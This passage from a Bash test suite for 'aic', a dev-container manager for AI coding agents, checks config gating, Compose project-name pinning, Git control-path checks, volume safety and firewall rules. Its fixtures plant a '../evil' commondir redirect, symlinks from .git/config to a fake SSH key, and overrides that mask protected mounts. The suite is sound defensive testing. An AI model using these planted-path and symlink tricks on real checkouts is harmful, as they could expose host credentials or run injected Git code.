  || fail "the stack of an earlier project identity was not stopped"
grep -q "<compose> <-p> <$prev_project>.*<down>" "$log" \
  || fail "the stack of an earlier project identity did not reach trusted compose down"
grep -q "<--remove-orphans>" "$log" && fail "earlier-identity cleanup used --remove-orphans"

# Identity comes from the stored spelling of the path, never the typed one.
# Bash's builtin `pwd -P` keeps the typed case, so only /bin/pwd (canonical_root)
# may sit in the identity code. The behavior itself needs a case-insensitive
# volume (macOS default), so the second half skips on case-sensitive ones.
if grep -v '^[[:space:]]*#' "$ROOT/aic" | grep 'pwd -P' | grep -vF '/bin/pwd -P; else pwd -P'; then
  fail "aic uses the builtin pwd -P, which keeps the typed letter case"
fi
mkdir -p "$TMP/CaseProbe/Repo"
if [ -d "$TMP/caseprobe/repo" ]; then
  new_project "$TMP/CaseProbe/Repo"
  real_name=$(sed -n 's/^name:[[:space:]]*//p' "$TMP/CaseProbe/Repo/.devcontainer/docker-compose.yml")
  [ -n "$real_name" ] || fail "case probe project has no Compose name"
  out=$(cd "$TMP/caseprobe/repo" && AIC_HOME="$ROOT" "$ROOT/aic" validate 2>&1) \
    || fail "validate rejected the project when started from a wrong-case path: $out"
  (cd "$TMP/caseprobe/repo" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
  [ "$(sed -n 's/^name:[[:space:]]*//p' "$TMP/CaseProbe/Repo/.devcontainer/docker-compose.yml")" = "$real_name" ] \
    || fail "sync from a wrong-case path changed the project identity"
  grep -qx "AIC_STATUS_PROJECT_ID=$real_name" "$TMP/CaseProbe/Repo/.devcontainer/.env" \
    || fail "the runtime environment file did not keep the stored-case identity"
fi

# Commands that call `devcontainer exec` must apply the full resolved-config
# gate first; path/symlink validation alone is insufficient because the CLI
# parses repository Compose/devcontainer control files on every invocation.
new_project "$TMP/exec-gate"
sed -E 's/"service":[[:space:]]*"devcontainer"/"service": "attacker"/' \
  "$TMP/exec-gate/.devcontainer/devcontainer.json" \
  > "$TMP/exec-gate/.devcontainer/devcontainer.json.tmp"
mv "$TMP/exec-gate/.devcontainer/devcontainer.json.tmp" \
  "$TMP/exec-gate/.devcontainer/devcontainer.json"
for command in shell run signing; do
  : > "$log"
  case "$command" in
    shell) args=(shell) ;;
    run) args=(run true) ;;
    signing) args=(signing disable) ;;
  esac
  if (cd "$TMP/exec-gate" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
      AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
      AIC_HOME="$ROOT" "$ROOT/aic" "${args[@]}" >/dev/null 2>&1); then
    fail "$command consumed a tampered devcontainer config"
  fi
  [ ! -s "$log" ] || fail "$command reached an execution tool before configuration validation"
done

# The provider override above is intentionally hostile and served its cleanup
# test. Move it out before testing valid shell execution through the new gate.
mv "$TMP/cleanup/.devcontainer/docker-compose.override.yml" "$TMP/provider-fixture.yml"
(cd "$TMP/cleanup" && AIC_HOME="$ROOT" "$ROOT/aic" sync --shell bash >/dev/null)

# macOS still ships Bash 3.2, whose `set -u` handling treats an empty array
# expansion as unbound. The ordinary no-argument startup paths must not trip
# over their optional forwarded-argument arrays.
: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_HOME="$ROOT" "$ROOT/aic" up >/dev/null)
grep -q '^devcontainer <up> <--workspace-folder> <\.>$' "$log" \
  || fail "no-argument up did not reach devcontainer on Bash 3.2"
: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_HOME="$ROOT" "$ROOT/aic" rebuild >/dev/null)
grep -q '^devcontainer <up> <--workspace-folder> <\.> <--remove-existing-container> <--build-no-cache>$' "$log" \
  || fail "no-argument rebuild did not reach devcontainer on Bash 3.2"

: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_HOME="$ROOT" "$ROOT/aic" shell)
grep -q '<bash> <--noprofile> <--rcfile> </etc/aic/shell/bashrc> <-i>' "$log" \
  || fail "bash shell did not use the managed root-owned rc file"
(cd "$TMP/cleanup" && AIC_HOME="$ROOT" "$ROOT/aic" sync --shell fish >/dev/null)
: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_HOME="$ROOT" "$ROOT/aic" shell)
grep -q "<fish> <--no-config> <-C> <source /etc/fish/conf.d/aic.fish>" "$log" \
  || fail "fish shell did not use the managed root-owned config"

new_project "$TMP/initialize"
seed_home="$TMP/seed-home"; mkdir "$seed_home"
: > "$log"
(cd "$TMP/initialize" && PATH="$fakebin:$PATH" HOME="$seed_home" \
  DOCKER_CONFIG="$REAL_DOCKER_CONFIG" AIC_REAL_DOCKER="$REAL_DOCKER" \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" initialize)
for file in .gitconfig .claude/settings.json .codex/config.toml .config/opencode/opencode.json; do
  [ -f "$seed_home/$file" ] || fail "initialize did not prepare host seed $file"
done
grep -q '<volume> <create> <aic-auth-global>' "$log" || fail "initialize did not prepare global auth volume"
grep -q '_aic-sessions>' "$log" || fail "initialize did not prepare hashed sessions volume"
grep -q '<rm> <-sf> <aic-seed-sanitizer>' "$log" || fail "initialize did not force-refresh sanitizer service"
grep -q 'busybox@sha256:fd8d9aa' "$log" || fail "initialize helper image was not digest-pinned"
# Re-own only entries with the wrong owner or group; a full chown -R rewrote
# the whole transcript tree on every start.
! grep -q 'chown -h -R' "$log" || fail "initialize re-owned whole volumes with chown -R"
[ "$(grep -c '! -user "$AIC_UID" -o ! -group "$AIC_GID"' "$log")" -ge 2 ] \
  || fail "initialize helpers did not limit chown to wrong-owner entries"
# The agent-writable sessions volume never shares a helper run with the
# global auth or shell-history volume.
grep -q '_aic-sessions:/v>' "$log" || fail "initialize did not run the sessions migration helper"
grep '_aic-sessions:/v' "$log" | grep -q 'aic-auth-global\|aic-shell-history' \
  && fail "sessions migration helper also mounted a global volume"
for placeholder in \
  tool-homes/claude tool-homes/codex tool-homes/opencode-config \
  tool-homes/opencode-data tool-homes/gh tool-homes/npm \
  /v/claude /v/codex /v/opencode /v/gh /v/npm signing semgrep
do
  grep -q "$placeholder" "$log" \
    || fail "initialize did not seed managed nested-mount placeholder: $placeholder"
done

# Pre-created bind-backed/plugin volumes are rejected before any root helper
# mounts them. Compose's in-repository volume definitions are not sufficient.
: > "$log"
if (cd "$TMP/initialize" && PATH="$fakebin:$PATH" HOME="$seed_home" \
    DOCKER_CONFIG="$REAL_DOCKER_CONFIG" AIC_REAL_DOCKER="$REAL_DOCKER" \
    AIC_FAKE_UNSAFE_VOLUME=aic-auth-global AIC_TEST_LOG="$log" \
    AIC_HOME="$ROOT" "$ROOT/aic" initialize >/dev/null 2>&1); then
  fail "initialize accepted a bind-backed managed volume"
fi
grep -q '<volume> <inspect>.*<aic-auth-global>' "$log" \
  || fail "initialize did not inspect the physical auth volume"
grep -q '<run>' "$log" && fail "root helper ran after unsafe volume detection"

# The Dev Containers CLI takes COMPOSE_PROJECT_NAME from its environment, then
# from the repository-root .env, before the managed Compose `name:`. Either one
# would move this checkout into another Compose project (another checkout's
# containers and session volumes, or the user's app stack). aic's own CLI calls
# pin the managed name; a direct start that cannot pin it is refused before
# Docker is touched, and the refusal never prints the value it read.
new_project "$TMP/root-env"
root_env_name=$(sed -n 's/^name:[[:space:]]*//p' "$TMP/root-env/.devcontainer/docker-compose.yml")
printf 'APP_PORT=3000\nCOMPOSE_PROJECT_NAME="Root-Env-Value"\n' > "$TMP/root-env/.env"
env_log="$TMP/devcontainer-env.log"
for command in up rebuild shell run; do
  case "$command" in
    run) args=(run true) ;;
    *) args=("$command") ;;
  esac
  : > "$env_log"
  (cd "$TMP/root-env" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
    AIC_TEST_ENV_LOG="$env_log" COMPOSE_PROJECT_NAME=inherited-other \
    AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
    AIC_HOME="$ROOT" "$ROOT/aic" "${args[@]}" >/dev/null 2>&1) \
    || fail "$command refused a project whose root .env sets COMPOSE_PROJECT_NAME"
  [ "$(cat "$env_log")" = "COMPOSE_PROJECT_NAME=$root_env_name" ] \
    || fail "$command did not pin the managed Compose name for the Dev Containers CLI"
done

: > "$log"
set +e
out=$(cd "$TMP/root-env" && PATH="$fakebin:$PATH" HOME="$seed_home" \
  DOCKER_CONFIG="$REAL_DOCKER_CONFIG" AIC_REAL_DOCKER="$REAL_DOCKER" \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" initialize 2>&1)
root_env_rc=$?
set -e
[ "$root_env_rc" -ne 0 ] || fail "initialize accepted a root .env that renames the Compose project"
echo "$out" | grep -q 'repository-root .env sets COMPOSE_PROJECT_NAME' \
  || fail "initialize did not name the root .env as the project-name source"
echo "$out" | grep -qi 'root-env-value' && fail "initialize printed a value read from the root .env"
[ ! -s "$log" ] || fail "initialize reached Docker before refusing the root .env project name"

# `aic up` exports the managed name to the CLI, so its initializeCommand child
# inherits it. That source wins over the root .env and must be accepted.
(cd "$TMP/root-env" && PATH="$fakebin:$PATH" HOME="$seed_home" \
  COMPOSE_PROJECT_NAME="$root_env_name" \
  DOCKER_CONFIG="$REAL_DOCKER_CONFIG" AIC_REAL_DOCKER="$REAL_DOCKER" \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" initialize >/dev/null 2>&1) \
  || fail "initialize refused the managed name inherited from aic up"

# The fake Docker context above rewrote .devcontainer/.env; restore the real one.
(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
set +e
out=$(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" validate 2>&1)
root_env_rc=$?
set -e
[ "$root_env_rc" -ne 0 ] || fail "validate accepted a root .env that renames the Compose project"
echo "$out" | grep -q 'repository-root .env sets COMPOSE_PROJECT_NAME' \
  || fail "validate did not report the root .env project name"
out=$(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" doctor 2>&1) \
  && fail "doctor reported ready while a direct start would be refused"
echo "$out" | grep -q '^FAIL  a direct Dev Containers start (VS Code) would be refused' \
  || fail "doctor did not report the root .env project name"
out=$(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1) \
  || fail "legacy check-drift initializer stopped a startup"
echo "$out" | grep -q 'repository-root .env sets COMPOSE_PROJECT_NAME' \
  || fail "legacy check-drift initializer did not warn about the root .env project name"

# Mirror the CLI's lookup: commented, exported, indented, and empty lines are
# not project names; neither is an .env directory. A FIFO could hang the CLI.
printf '%s\n' '# COMPOSE_PROJECT_NAME=a' 'export COMPOSE_PROJECT_NAME=b' \
  ' COMPOSE_PROJECT_NAME=c' 'COMPOSE_PROJECT_NAME=' > "$TMP/root-env/.env"
(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" validate >/dev/null 2>&1) \
  || fail "validate treated a line the Dev Containers CLI ignores as a project name"
rm "$TMP/root-env/.env"
mkdir "$TMP/root-env/.env"
(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" validate >/dev/null 2>&1) \
  || fail "validate refused an .env directory, which the Dev Containers CLI ignores"
rmdir "$TMP/root-env/.env"
mkfifo "$TMP/root-env/.env"
(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" validate >/dev/null 2>&1) \
  && fail "validate accepted a root .env that is not a regular file"
rm "$TMP/root-env/.env"
set +e
out=$(cd "$TMP/root-env" && COMPOSE_PROJECT_NAME=inherited-other \
  AIC_HOME="$ROOT" "$ROOT/aic" validate 2>&1)
root_env_rc=$?
set -e
[ "$root_env_rc" -ne 0 ] || fail "validate accepted an inherited COMPOSE_PROJECT_NAME"
echo "$out" | grep -q 'COMPOSE_PROJECT_NAME in the environment' \
  || fail "validate did not report the inherited COMPOSE_PROJECT_NAME"
(cd "$TMP/root-env" && AIC_HOME="$ROOT" "$ROOT/aic" validate >/dev/null) \
  || fail "validate refused a project without a root .env project name"

# Host Git runs code named in .git/config, config.worktree, and hooks, and it
# loads them from the directory .git/commondir names. These paths are mounted
# read-only over the writable workspace, so aic creates the two files Git does
# not make for a main checkout (Docker would create root-owned directories)
# and refuses any state that would mount a host file or a planted redirect.
# Every startup refusal happens before Docker is touched.
git_paths_run() {
  local dir="$1"; shift
  (cd "$dir" && PATH="$fakebin:$PATH" HOME="$seed_home" AIC_TEST_LOG="$log" \
    AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
    AIC_HOME="$ROOT" "$ROOT/aic" "$@" </dev/null 2>&1)
}
# Read-only commands use the real Docker context, which wrote .devcontainer/.env.
git_paths_check() {
  local dir="$1"; shift
  (cd "$dir" && AIC_HOME="$ROOT" "$ROOT/aic" "$@" </dev/null 2>&1)
}
git_paths_refused() {
  local dir="$1" expected="$2" command rc out
  for command in validate up initialize; do
    : > "$log"
    set +e
    if [ "$command" = validate ]; then
      out=$(git_paths_check "$dir" validate)
    else
      out=$(git_paths_run "$dir" "$command")
    fi
    rc=$?
    set -e
    [ "$rc" -ne 0 ] || fail "$command accepted unsafe Git control paths ($expected)"
    echo "$out" | grep -Fq "$expected" \
      || { printf '%s\n' "$out" >&2; fail "$command did not report: $expected"; }
    [ ! -s "$log" ] || fail "$command reached Docker or Dev Containers before refusing: $expected"
  done
}

new_project "$TMP/git-paths"
[ "$(cat "$TMP/git-paths/.git/commondir")" = "." ] && [ "$(wc -c < "$TMP/git-paths/.git/commondir" | tr -d ' ')" = 2 ] \
  || fail "init did not create .git/commondir with the self-referencing value"
[ -f "$TMP/git-paths/.git/config.worktree" ] && [ ! -s "$TMP/git-paths/.git/config.worktree" ] \
  || fail "init did not create an empty .git/config.worktree"
[ "$(git -C "$TMP/git-paths" rev-parse --is-inside-work-tree)" = true ] \
  || fail "the managed .git/commondir broke host Git"

# A fresh clone has neither file. Read-only commands accept that and create
# nothing; every startup path creates both (and a missing hooks/) itself.
rm "$TMP/git-paths/.git/commondir" "$TMP/git-paths/.git/config.worktree"
rm -rf "$TMP/git-paths/.git/hooks"
out=$(git_paths_check "$TMP/git-paths" validate) \
  || { printf '%s\n' "$out" >&2; fail "validate refused a fresh clone without the aic-created Git control files"; }
[ ! -e "$TMP/git-paths/.git/commondir" ] || fail "validate wrote into .git"
git_paths_run "$TMP/git-paths" initialize >/dev/null \
  || fail "initialize refused a fresh clone without the aic-created Git control files"
[ "$(cat "$TMP/git-paths/.git/commondir")" = "." ] && [ -f "$TMP/git-paths/.git/config.worktree" ] \
  && [ -d "$TMP/git-paths/.git/hooks" ] \
  || fail "initialize did not create the Git control files before Compose"
rm "$TMP/git-paths/.git/commondir"
git_paths_run "$TMP/git-paths" up >/dev/null || fail "up refused a missing .git/commondir"
[ "$(cat "$TMP/git-paths/.git/commondir")" = "." ] || fail "up did not create .git/commondir"
# The fake Docker context rewrote .devcontainer/.env; restore the real one.
git_paths_check "$TMP/git-paths" sync >/dev/null

# A main checkout never has commondir. Another value is planted: refuse it
# everywhere, including sync, and never rewrite it.
printf '../evil\n' > "$TMP/git-paths/.git/commondir"
git_paths_refused "$TMP/git-paths" ".git/commondir must contain only '.'"
git_paths_check "$TMP/git-paths" sync >/dev/null && fail "sync accepted a planted .git/commondir"
[ "$(cat "$TMP/git-paths/.git/commondir")" = "../evil" ] || fail "aic rewrote a planted .git/commondir"
out=$(git_paths_check "$TMP/git-paths" doctor) && fail "doctor reported ready with a planted .git/commondir"
echo "$out" | grep -q "^FAIL  .git/commondir must contain only '.'" \
  || fail "doctor did not report a planted .git/commondir"
printf '.\n\n' > "$TMP/git-paths/.git/commondir"
git_paths_refused "$TMP/git-paths" ".git/commondir must contain only '.'"
: > "$TMP/git-paths/.git/commondir"
git_paths_refused "$TMP/git-paths" ".git/commondir must contain only '.'"

# O_EXCL creation never writes through a symlink planted at a missing path.
rm "$TMP/git-paths/.git/commondir"
ln -s "$TMP/commondir-target" "$TMP/git-paths/.git/commondir"
git_paths_refused "$TMP/git-paths" '.git/commondir must be a regular file, not a symlink'
[ ! -e "$TMP/commondir-target" ] || fail "aic created .git/commondir through a symlink"
rm "$TMP/git-paths/.git/commondir"; printf '.\n' > "$TMP/git-paths/.git/commondir"
git_paths_check "$TMP/git-paths" validate >/dev/null || fail "validate refused restored Git control files"

# Docker resolves bind sources on the host: a symlinked control path would
# mount a host file from outside the checkout. Resolving the expected path too
# used to compare the symlink with itself and report the project valid.
mkdir -p "$TMP/host-secrets/hooks"
printf 'host secret\n' > "$TMP/host-secrets/id_ed25519"
mv "$TMP/git-paths/.git/config" "$TMP/git-paths/.git/config.real"
ln -s "$TMP/host-secrets/id_ed25519" "$TMP/git-paths/.git/config"
git_paths_refused "$TMP/git-paths" '.git/config must be a regular file, not a symlink'
out=$(git_paths_check "$TMP/git-paths" validate) || true
echo "$out" | grep -q 'managed mount source for /workspace/.git/config escaped this project' \
  || fail "resolved-config validation accepted a symlinked .git/config mount source"
rm "$TMP/git-paths/.git/config"; mv "$TMP/git-paths/.git/config.real" "$TMP/git-paths/.git/config"
mv "$TMP/git-paths/.git/hooks" "$TMP/git-paths/.git/hooks.real"
ln -s "$TMP/host-secrets/hooks" "$TMP/git-paths/.git/hooks"
git_paths_refused "$TMP/git-paths" '.git/hooks must be a real directory, not a symlink'
rm "$TMP/git-paths/.git/hooks"; mv "$TMP/git-paths/.git/hooks.real" "$TMP/git-paths/.git/hooks"
mv "$TMP/git-paths/.git/config.worktree" "$TMP/git-paths/.git/config.worktree.real"
ln -s "$TMP/host-secrets/id_ed25519" "$TMP/git-paths/.git/config.worktree"
git_paths_refused "$TMP/git-paths" '.git/config.worktree must be a regular file, not a symlink'
rm "$TMP/git-paths/.git/config.worktree"
mv "$TMP/git-paths/.git/config.worktree.real" "$TMP/git-paths/.git/config.worktree"

mv "$TMP/git-paths/.git" "$TMP/host-secrets/repo.git"
ln -s "$TMP/host-secrets/repo.git" "$TMP/git-paths/.git"
git_paths_refused "$TMP/git-paths" '.git must be a real directory, not a symlink'
git_paths_check "$TMP/git-paths" sync >/dev/null && fail "sync accepted a symlinked .git"
rm "$TMP/git-paths/.git"; mv "$TMP/host-secrets/repo.git" "$TMP/git-paths/.git"

# Linked worktrees and submodule checkouts have a .git file; the read-only
# mounts need a directory. A missing .git is refused at startup but only warned
# about by init, so 'git init' can still follow 'aic init'.
mv "$TMP/git-paths/.git" "$TMP/git-paths.git"
printf 'gitdir: %s\n' "$TMP/git-paths.git" > "$TMP/git-paths/.git"
git_paths_refused "$TMP/git-paths" '.git is not a directory'
rm "$TMP/git-paths/.git"
git_paths_refused "$TMP/git-paths" 'there is no .git directory here'
[ ! -e "$TMP/git-paths/.git" ] || fail "aic created a .git directory"
mkdir "$TMP/no-git"
out=$(cd "$TMP/no-git" && AIC_HOME="$ROOT" "$ROOT/aic" init --with codex --shell zsh 2>&1) \
  || fail "init refused a directory that has no .git yet"
echo "$out" | grep -q "or 'git init' before 'aic up'" \
  || fail "init did not warn that the directory has no .git"
[ ! -e "$TMP/no-git/.git" ] || fail "init created a .git directory"
mv "$TMP/git-paths.git" "$TMP/git-paths/.git"

# The self-bind keeps .git a mount point that cannot be renamed. An override
# that drops or masks any Git control mount reopens the bypass.
cat > "$TMP/git-paths/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    volumes:
      - ./README.md:/workspace/.git/commondir:ro
      - ../.git/objects:/workspace/.git
YAML
git_paths_check "$TMP/git-paths" sync >/dev/null
out=$(git_paths_check "$TMP/git-paths" validate) && fail "validate accepted an override over the Git control mounts"
for target in /workspace/.git /workspace/.git/commondir; do
  echo "$out" | grep -Fq "devcontainer override removes managed protection for $target" \
    || { printf '%s\n' "$out" >&2; fail "override over $target was not flagged"; }
done
rm "$TMP/git-paths/.devcontainer/docker-compose.override.yml"
git_paths_check "$TMP/git-paths" sync >/dev/null

# `aic signing` creates the signing/ dir as vscode (0700, owned by the runtime
# UID) inside the container. The host-side signing_state probe runs busybox as
# root, so it must keep DAC_READ_SEARCH: without it root cannot traverse that
# 0700 tree, `test -f` on the key fails, and every `aic signing status` / boot
# check would falsely report an unsigned "no key" state even when signing is
# configured and working. Assert the read-only inspect keeps exactly that
# capability and gains no write bypass.
new_project "$TMP/signing-status"
: > "$log"
(cd "$TMP/signing-status" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_HOME="$ROOT" "$ROOT/aic" signing status >/dev/null 2>&1)
signing_probe=$(grep -F '<aic-auth-global:/v:ro>' "$log" || true)
[ -n "$signing_probe" ] \
  || fail "signing status did not run the read-only aic-auth-global probe"
case "$signing_probe" in
  *'<--cap-add> <DAC_READ_SEARCH>'*) ;;
  *) fail "signing_state probe dropped DAC_READ_SEARCH; 0700 signing dir reads as no key" ;;
esac
case "$signing_probe" in
  *DAC_OVERRIDE*) fail "signing_state read-only probe must not gain a write bypass" ;;
esac

# aic-firewall OUTPUT chains may accept ESTABLISHED/RELATED only as replies
# (--ctdir REPLY). A blanket accept lets an outbound session that the container
# opened before `enable` keep running to a host that is not on the allowlist.
fw_established=$(grep -E '(ipt|ip6t) -A "\$out6?_chain" .*ctstate' "$ROOT/template/aic-firewall" || true)
[ "$(printf '%s\n' "$fw_established" | grep -c .)" = 2 ] \
  || fail "aic-firewall must have exactly one IPv4 and one IPv6 OUTPUT conntrack accept"
if printf '%s\n' "$fw_established" | grep -vqF -- '--ctdir REPLY'; then
  fail "aic-firewall OUTPUT accepts ESTABLISHED,RELATED without --ctdir REPLY"
fi

echo "OK: host CLI symlink, merge, provenance, naming, and fail-closed checks passed"
